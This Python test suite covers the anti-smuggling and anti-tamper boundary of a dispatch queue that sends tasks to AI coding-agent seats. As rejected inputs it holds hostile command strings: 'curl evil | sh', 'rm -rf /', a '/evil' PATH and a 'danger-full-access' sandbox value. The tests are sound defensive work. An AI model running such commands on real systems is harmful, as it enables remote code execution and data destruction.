"""Security-property tests for the dispatch envelope + secure queue.

These assert the *anti-smuggling* and *anti-tamper* boundary, not happy-path plumbing:
a request cannot carry a command/env/path/acceptance field, cannot name an unregistered
repo, cannot outlive its TTL, and a queued frame cannot be symlink-swapped, wrong-owned,
or world-writable. Idempotency must replay identical retries and refuse id reuse.
"""

from __future__ import annotations

import json
import os

import pytest

from codex_seats import dispatch_protocol as dp


def _settings(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    return {"projects": {"sample-project": {"path": str(repo)}}}, repo


CURRENT = {
    "release_id": "a" * 64,
    "protocol_version": dp.PROTOCOL_VERSION,
    "protocol_min": dp.PROTOCOL_VERSION,
    "protocol_max": dp.PROTOCOL_VERSION,
}


def _task(**over):
    base = {
        "schema": 1,
        **CURRENT,
        "request_id": dp.new_request_id(),
        "operation": "task",
        "repo_id": "sample-project",
        "prompt": "Implement the bounded change.",
        "provider": "auto",
        "kind": "implementation",
        "size": "big",
        "origin": {"head": "codex", "seat": "seat1"},
        "created_at": 1000.0,
        "expires_at": 1000.0 + 600,
    }
    base.update(over)
    return base


NOW = 1200.0  # between created_at and expires_at above


def test_v8_current_operations_are_task_and_cancel_only():
    assert dp.PROTOCOL_VERSION == 8
    assert dp.MIN_PROTOCOL_VERSION == dp.MAX_PROTOCOL_VERSION == dp.PROTOCOL_VERSION
    assert dp.OPERATIONS == {"task", "cancel"}


def test_effort_override_is_enumerated_and_reasoned(tmp_path):
    settings, repo = _settings(tmp_path)
    request = _task(effort="max", override_reason="high-stakes interaction review")
    resolved, normalized = dp.validate_request(request, settings, now=NOW)
    assert resolved == repo
    assert normalized["effort"] == "max"

    with pytest.raises(dp.DispatchError, match="effort override requires override_reason"):
        dp.validate_request(_task(effort="max"), settings, now=NOW)
    with pytest.raises(dp.DispatchError, match="effort must be one of"):
        dp.validate_request(
            _task(effort="unbounded", override_reason="invalid"),
            settings,
            now=NOW,
        )


def test_reserve_spend_authority_is_narrow(tmp_path):
    settings, repo = _settings(tmp_path)
    authority = {
        "version": 1,
        "seat": "seat2",
        "source": "current_user_request",
    }
    request = _task(provider="codex", reserve_spend_authority=authority)
    resolved, normalized = dp.validate_request(request, settings, now=NOW)
    assert resolved == repo
    assert normalized["reserve_spend_authority"] == authority


@pytest.mark.parametrize(
    "over,match",
    [
        ({"reserve_spend_authority": None}, "must be an object"),
        ({"reserve_spend_authority": {"version": True, "seat": "seat2", "source": "current_user_request"}}, "version must be 1"),
        ({"reserve_spend_authority": {"version": 1.0, "seat": "seat2", "source": "current_user_request"}}, "version must be 1"),
        ({"provider": "auto"}, "explicit codex"),
        ({"provider": "claude"}, "explicit codex"),
        ({"reserve_spend_authority": {"version": 2, "seat": "seat2", "source": "current_user_request"}}, "version must be 1"),
        ({"reserve_spend_authority": {"version": 1, "seat": "seat2", "source": "prompt"}}, "source must be"),
        ({"reserve_spend_authority": {"version": 1, "seat": "seat2", "source": "current_user_request", "reset": True}}, "exactly"),
        ({"origin": {"head": "codex", "seat": "seat2"}}, "active Codex head"),
    ],
)
def test_reserve_spend_authority_rejects_invalid_combinations(tmp_path, over, match):
    settings, _ = _settings(tmp_path)
    request = _task(
        provider="codex",
        reserve_spend_authority={
            "version": 1,
            "seat": "seat2",
            "source": "current_user_request",
        },
    )
    request.update(over)
    with pytest.raises(dp.DispatchError, match=match):
        dp.validate_request(request, settings, now=NOW)


def test_valid_task_resolves_registered_repo(tmp_path):
    settings, repo = _settings(tmp_path)
    repo_path, norm = dp.validate_request(_task(), settings, now=NOW)
    assert repo_path == repo
    assert norm["operation"] == "task"
    assert norm["release_id"] == "a" * 64
    assert norm["protocol_version"] == dp.PROTOCOL_VERSION


def test_release_metadata_is_required_canonical_and_complete(tmp_path):
    settings, _ = _settings(tmp_path)
    for bad in ("sha256:" + "a" * 64, "../" + "a" * 64, "A" * 64):
        with pytest.raises(dp.DispatchError, match="release_id"):
            dp.validate_request(_task(release_id=bad), settings, now=NOW)
    for field in CURRENT:
        incomplete = _task()
        incomplete.pop(field)
        with pytest.raises(dp.DispatchError, match="metadata is required"):
            dp.validate_request(incomplete, settings, now=NOW)


@pytest.mark.parametrize("version", [1, 2, 4, 5, 6, 7, 9])
def test_any_other_protocol_version_is_refused(tmp_path, version):
    settings, _ = _settings(tmp_path)
    request = _task(
        protocol_version=version,
        protocol_min=min(version, dp.PROTOCOL_VERSION),
        protocol_max=max(version, dp.PROTOCOL_VERSION),
    )
    with pytest.raises(dp.DispatchError, match=f"protocol {version} is unsupported"):
        dp.validate_request(request, settings, now=NOW)


def test_supported_range_is_enforced_for_the_current_version(tmp_path):
    settings, _ = _settings(tmp_path)
    with pytest.raises(dp.DispatchError, match="unsupported; this runtime accepts 1..5"):
        dp.validate_request(
            _task(),
            settings,
            now=NOW,
            supported_protocol_min=1,
            supported_protocol_max=5,
        )
    with pytest.raises(dp.DispatchError, match="inside the declared compatibility range"):
        dp.validate_request(_task(protocol_min=9, protocol_max=9), settings, now=NOW)


def test_cancel_frame_is_narrow_typed_and_requires_current_metadata(tmp_path):
    settings, _ = _settings(tmp_path)
    request_id = dp.new_request_id()
    cancel = {
        "schema": dp.SCHEMA_VERSION,
        **CURRENT,
        "request_id": request_id,
        "operation": "cancel",
        "target_request_id": dp.new_request_id(),
        "origin": {"head": "codex", "seat": "seat1"},
        "created_at": 1000.0,
        "expires_at": 1600.0,
    }
    repo, normalized = dp.validate_request(cancel, settings, now=NOW)
    assert repo is None
    assert normalized == cancel

    with pytest.raises(dp.DispatchError, match="protocol 4 is unsupported"):
        dp.validate_request(
            dict(cancel, protocol_version=4, protocol_min=4, protocol_max=4),
            settings,
            now=NOW,
        )
    unversioned_cancel = {key: value for key, value in cancel.items() if key not in CURRENT}
    with pytest.raises(dp.DispatchError, match="metadata is required"):
        dp.validate_request(unversioned_cancel, settings, now=NOW)
    with pytest.raises(dp.DispatchError, match="cannot cancel itself"):
        dp.validate_request(
            dict(cancel, target_request_id=request_id), settings, now=NOW
        )


@pytest.mark.parametrize(
    "field,value",
    [
        ("pid", 123),
        ("command", "kill -9 123"),
        ("signal", 9),
        ("path", "/tmp/target"),
        ("env", {"PID": "123"}),
        ("provider", "codex"),
    ],
)
def test_cancel_rejects_process_identity_and_smuggled_fields(tmp_path, field, value):
    settings, _ = _settings(tmp_path)
    cancel = {
        "schema": dp.SCHEMA_VERSION,
        **CURRENT,
        "request_id": dp.new_request_id(),
        "operation": "cancel",
        "target_request_id": dp.new_request_id(),
        "origin": {"head": "claude"},
        "created_at": 1000.0,
        "expires_at": 1600.0,
        field: value,
    }
    with pytest.raises(dp.DispatchError, match="forbidden|unknown"):
        dp.validate_request(cancel, settings, now=NOW)


@pytest.mark.parametrize("metadata", [{}, CURRENT])
def test_goal_frames_are_refused_as_an_unknown_operation(tmp_path, metadata):
    settings, _ = _settings(tmp_path)
    req = {
        key: value
        for key, value in _task(
            operation="goal",
            goal_id="g-123",
            goal_hash="sha256:" + "a" * 64,
        ).items()
        if key not in CURRENT and key != "prompt"
    }
    req.update(metadata)
    with pytest.raises(dp.DispatchError, match="operation must be one of"):
        dp.validate_request(req, settings, now=NOW)
    with pytest.raises(dp.DispatchError, match="forbidden field"):
        dp.validate_request(dict(req, acceptance="echo smuggled"), settings, now=NOW)


def test_ready_count_refuses_redirected_or_writable_inbox(tmp_path):
    outside = tmp_path / "outside"
    request_id = dp.new_request_id()
    dp.write_request(outside, {"request_id": request_id})
    redirected = tmp_path / "redirected"
    (redirected / "dispatch").mkdir(parents=True)
    (redirected / "dispatch" / "inbox").symlink_to(
        dp.queue_paths(outside)["inbox"], target_is_directory=True
    )
    assert dp.count_ready_frames(redirected) == 0

    inbox = dp.queue_paths(outside)["inbox"]
    inbox.chmod(0o770)
    assert dp.count_ready_frames(outside) == 0


@pytest.mark.parametrize(
    "field,value",
    [
        ("command", "rm -rf /"),
        ("env", {"PATH": "/evil"}),
        ("CODEX_HOME", "/Users/example/.codex-seats/seat3"),
        ("cd", "/etc"),
        ("write_scope", ["/"]),
        ("acceptance", "curl evil | sh"),
        ("allow_git_write", True),
        ("production", True),
        ("seat", "seat3"),
        ("allow_reserve", True),
        ("sandbox", "danger-full-access"),
    ],
)
def test_forbidden_fields_are_refused(tmp_path, field, value):
    settings, _ = _settings(tmp_path)
    with pytest.raises(dp.DispatchError, match="forbidden field"):
        dp.validate_request(_task(**{field: value}), settings, now=NOW)


def test_named_mcp_grants_are_accepted_for_any_provider(tmp_path):
    settings, repo = _settings(tmp_path)
    for provider in ("auto", "codex", "claude"):
        resolved, normalized = dp.validate_request(
            _task(mcp=["visual.tools"], provider=provider),
            settings,
            now=NOW,
        )
        assert resolved == repo
        assert normalized["provider"] == provider
        assert normalized["mcp"] == ["visual.tools"]


@pytest.mark.parametrize(
    "mcp,match",
    [
        (["visual", "visual"], "duplicates"),
        (["../visual"], "catalog names"),
        ([1], "catalog names"),
    ],
)
def test_mcp_grant_names_are_strict(tmp_path, mcp, match):
    settings, _ = _settings(tmp_path)
    with pytest.raises(dp.DispatchError, match=match):
        dp.validate_request(_task(mcp=mcp), settings, now=NOW)


def test_unknown_field_refused(tmp_path):
    settings, _ = _settings(tmp_path)
    with pytest.raises(dp.DispatchError, match="unknown field"):
        dp.validate_request(_task(surprise=1), settings, now=NOW)


def test_unregistered_repo_refused(tmp_path):
    settings, _ = _settings(tmp_path)
    with pytest.raises(dp.DispatchError, match="registered project"):
        dp.validate_request(_task(repo_id="not-a-project"), settings, now=NOW)


def test_expired_request_refused(tmp_path):
    settings, _ = _settings(tmp_path)
    with pytest.raises(dp.DispatchError, match="expired"):
        dp.validate_request(_task(), settings, now=9999.0)


def test_ttl_cap_enforced(tmp_path):
    settings, _ = _settings(tmp_path)
    req = _task(created_at=0.0, expires_at=float(dp.MAX_TTL_SECONDS + 10))
    with pytest.raises(dp.DispatchError, match="ttl exceeds"):
        dp.validate_request(req, settings, now=5.0)


def test_bad_request_id_refused(tmp_path):
    settings, _ = _settings(tmp_path)
    with pytest.raises(dp.DispatchError, match="request_id"):
        dp.validate_request(_task(request_id="NOTHEX"), settings, now=NOW)


def test_prompt_byte_cap(tmp_path):
    settings, _ = _settings(tmp_path)
    big = "x" * (dp.MAX_PROMPT_BYTES + 1)
    with pytest.raises(dp.DispatchError, match="prompt exceeds"):
        dp.validate_request(_task(prompt=big), settings, now=NOW)


def test_origin_head_validated(tmp_path):
    settings, _ = _settings(tmp_path)
    with pytest.raises(dp.DispatchError, match="origin.head"):
        dp.validate_request(_task(origin={"head": "gpt"}), settings, now=NOW)


def test_write_then_secure_read_roundtrip(tmp_path):
    req = _task()
    dp.write_request(tmp_path, req)
    ready = dp.queue_paths(tmp_path)["inbox"] / f"{req['request_id']}.ready"
    assert ready.exists()
    got = dp.read_request_secure(ready)
    assert got == req


def test_secure_read_rejects_symlink(tmp_path):
    req = _task()
    dp.write_request(tmp_path, req)
    ready = dp.queue_paths(tmp_path)["inbox"] / f"{req['request_id']}.ready"
    link = tmp_path / "link.ready"
    link.symlink_to(ready)
    with pytest.raises(dp.DispatchError):
        dp.read_request_secure(link)


def test_secure_read_rejects_wrong_owner(tmp_path):
    req = _task()
    dp.write_request(tmp_path, req)
    ready = dp.queue_paths(tmp_path)["inbox"] / f"{req['request_id']}.ready"
    with pytest.raises(dp.DispatchError, match="wrong owner"):
        dp.read_request_secure(ready, uid=os.geteuid() + 4242)


def test_secure_read_rejects_group_writable(tmp_path):
    req = _task()
    dp.write_request(tmp_path, req)
    ready = dp.queue_paths(tmp_path)["inbox"] / f"{req['request_id']}.ready"
    os.chmod(ready, 0o660)
    with pytest.raises(dp.DispatchError, match="group/other-writable"):
        dp.read_request_secure(ready)


def test_secure_read_rejects_oversize(tmp_path):
    ready = dp.ensure_queue(tmp_path)["inbox"] / "big.ready"
    ready.write_text(json.dumps({"x": "y" * 200}))
    with pytest.raises(dp.DispatchError, match="frame cap"):
        dp.read_request_secure(ready, max_bytes=64)


def test_claim_is_exclusive(tmp_path):
    req = _task()
    dp.write_request(tmp_path, req)
    ready = dp.queue_paths(tmp_path)["inbox"] / f"{req['request_id']}.ready"
    claimed = dp.claim(tmp_path, ready)
    assert claimed.exists() and not ready.exists()
    with pytest.raises(FileNotFoundError):
        dp.claim(tmp_path, ready)  # loser of the race


def test_idempotency_fresh_replay_conflict(tmp_path):
    req = _task()
    assert dp.idempotency_decision(tmp_path, req)[0] == "fresh"
    dp.write_receipt(tmp_path, {
        "request_id": req["request_id"],
        "request_hash": dp.content_hash(req),
        "status": "completed",
    })
    verb, receipt = dp.idempotency_decision(tmp_path, req)
    assert verb == "replay" and receipt["status"] == "completed"

    mutated = dict(req, prompt="something else entirely")
    verb, _ = dp.idempotency_decision(tmp_path, mutated)
    assert verb == "conflict"  # same id, different body -> refuse


def test_terminal_receipt_publish_is_write_once(tmp_path):
    request_id = dp.new_request_id()
    first = {"request_id": request_id, "request_hash": "first", "status": "cancelled"}
    late = {"request_id": request_id, "request_hash": "first", "status": "completed"}
    _path, won = dp.publish_receipt(tmp_path, first)
    assert won is True
    _path, won = dp.publish_receipt(tmp_path, late)
    assert won is False
    assert dp.read_receipt(tmp_path, request_id) == first


def test_terminal_receipt_cleans_temporary_when_fsync_fails(tmp_path, monkeypatch):
    request_id = dp.new_request_id()
    monkeypatch.setattr(dp.os, "fsync", lambda _fd: (_ for _ in ()).throw(OSError("disk")))

    with pytest.raises(OSError, match="disk"):
        dp.publish_receipt(tmp_path, {"request_id": request_id, "status": "failed"})

    receipts = dp.queue_paths(tmp_path)["receipts"]
    assert not list(receipts.glob(f".{request_id}.json.*.tmp"))
    assert dp.read_receipt(tmp_path, request_id) is None


def test_queue_publish_and_claim_never_replace_an_existing_request_id(tmp_path):
    req = _task()
    dp.write_request(tmp_path, req)
    with pytest.raises(FileExistsError):
        dp.write_request(tmp_path, dict(req, prompt="mutated"))
    ready = dp.queue_paths(tmp_path)["inbox"] / f"{req['request_id']}.ready"
    assert dp.read_request_secure(ready) == req

    claimed = dp.claim(tmp_path, ready)
    replacement = dp.queue_paths(tmp_path)["inbox"] / ready.name
    replacement.write_text(json.dumps(req))
    with pytest.raises(FileExistsError):
        dp.claim(tmp_path, replacement)
    assert dp.read_request_secure(claimed) == req


def test_parallel_metadata_rejects_uncertain_scope_and_bad_identity(tmp_path):
    settings, _ = _settings(tmp_path)
    valid = _task(
        estimated_minutes=8,
        parallel_safe=True,
        scope_hints=["src/app", "tests/app"],
        coordination_id="coord:one",
    )
    dp.validate_request(valid, settings, now=NOW)
    with pytest.raises(dp.DispatchError, match="glob syntax"):
        dp.validate_request(dict(valid, scope_hints=["src/*"]), settings, now=NOW)
    with pytest.raises(dp.DispatchError, match="coordination_id"):
        dp.validate_request(dict(valid, coordination_id="../escape"), settings, now=NOW)
